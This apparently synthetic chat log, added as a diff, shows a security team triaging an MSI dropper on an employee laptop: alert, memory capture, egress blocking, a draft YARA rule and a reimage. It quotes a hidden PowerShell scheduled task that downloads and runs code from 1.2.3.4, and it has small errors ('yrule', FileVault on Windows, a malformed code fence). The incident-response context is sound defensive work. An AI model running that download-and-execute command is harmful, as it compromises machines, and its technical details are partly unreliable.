@@ -1,0 +1,54 @@
+eng-security
+
+samir: EDR alert: MSI dropper detected and auto-quarantined on WIN-LAP-042 (owner: @amber). alert_id=EDR-20260318-8342
+sec-bot: alert details -> rule: Suspicious_MSI_Dropper, score: 86, action: quarantine, endpoint_id: ep-77b9, sha256: 3b9f5d2c9e7a4f8d9c2e7b1a5f2c9d3e6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1
+ellie: on call, will ping amber and pull host info. anyone seen this signature recently? :eyes:
+jordan: haven't seen that exact hash. can you paste process tree & command line from EDR?
+samir: EDR snippet ->
+```nprocess: msiexec.exe pid=4820 parent=explorer.exe cmd="msiexec /i C:\Users\amber\Downloads\update.msi"
+file_dropped: C:\Windows\Temp\tprx.dll sha256=3b9f5d2c...
+network: no outbound connections observed in last 5m
+```
+leo: jamf/MDM check? last checkin? any disk encryption status?
+ellie: Jamf shows last checkin 2026-03-18T09:01:12Z. FileVault: enabled. No recent MDM commands.
+samir: amber, can you confirm you downloaded an MSI? @amber
+amber: oof that was me, I clicked an "update" from a popup for a PDF editor earlier. I thought it was legit. Laptop feels fine. No other weird popups.
+jordan: amber, please disconnect from corp VPN and Wi‑Fi and plug to wired if needed for triage. We'll remotely pull a full scan and forensic snapshot.
+ellie: initiated remote deep scan + memory capture via EDR, job id=job-2247. Quarantine already placed on msiexec child and dropped DLL.
+sec-bot: scan status -> job-2247: running (10%)
+samir: good. also run 
+```
+edrctl collect ioc --endpoint ep-77b9 --artifacts process-list,svc-list,scheduled-tasks,netstat
+```
+so we get persistence candidates.
+jordan: got preliminary artifact dump: found a scheduled task "UpdaterCheck" created 2026-03-18T08:59:46 by amber. cmd -> powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/payload')"
+leo: that's an IOC. block that IP at egress and add to firewall denylist. @infra-team
+ellie: blocking IP at perimeter now. Also pushing host isolation policy to restrict outbound except to updates.apple or corp repos.
+amber: should I power off?
+samir: hold for now — we need memory capture live. If you power off we'll lose volatile info. Keep laptop on but disconnected from internet, follow jordan's steps.
+jordan: collected memory dump and process tree, no signs of lateral auth or unusual sessions. No suspicious RDP.
+sec-bot: yara scan results -> matched rule "Downloader_PowerShell_Obf" on dropped DLL and memory region.
+leo: good find. let's extract strings from DLL and check C2 domains. sha256 matches nothing in VirusTotal (private), submitting to internal threat intel.
+ellie: created ticket SEC-2026-842 and assigned to "incident-response". Marking amber laptop as "investigating"; planned remediation = reimage if persistence found.
+samir: next steps: 1) threat intel correlates IP 1.2.3.4 to malspam cluster; 2) run Enterprise wide hunt for rule "Downloader_PowerShell_Obf" and same scheduled task name; 3) notify SRE for any signs of lateral movement to infra.
+jordan: queued company-wide hunt, will post results in #eng-sre if anything shows.
+leo: forensics note: snapshot stored at s3://redwood-sec/forensics/2026-03-18/ep-77b9-1789003456.dmp (access via ticket only).
+ellie: amber, after we confirm no additional persistence we'll schedule a supervised reimage this afternoon and help restore from backup. Please save any unsynced docs to OneDrive.
+amber: thanks everyone. will follow instructions.
+sec-bot: scan job-2247 completed: found loader in temp, scheduled task presence, memory YARA hit. no lateral traces.
+samir: based on artifacts, escalate to malware team for YARA tuning and create detection for scheduled task pattern. Jordan — can you draft a quick YARA and a short IOCs list?
+jordan: will do. Draft:
+```
+yrule Suspicious_Updater_Task {
+  strings:
+    $s1 = "UpdaterCheck"
+    $s2 = "DownloadString('http://1.2.3.4' )"
+  condition: $s1 and $s2
+}
+```
+jordan: IOCs: IP 1.2.3.4, sha256 3b9f5d2c9e7a4f8d..., domain malicious.example (observed in payload), scheduled task name "UpdaterCheck".
+leo: pushing EDR rule to block on creation of task name Matcher "UpdaterCheck" and flag for manual review.
+ellie: amber reimage scheduled 2026-03-18 15:00 UTC, will hand to IT for wipe & restore. Amber to confirm backups done.
+amber: backed up to OneDrive, confirmed.
+samir: closing timeline: initial alert 1789003456 -> quarantine & remote scan initiated + memory capture -> indicators confirmed -> block egress IP + YARA rule created -> supervised reimage scheduled -> follow-up company hunt in progress. Will keep thread updated if hunt finds additional hits.
+jordan: noting action items in SEC-2026-842. closing for now but will re-open if hunt yields results. :thumbsup:
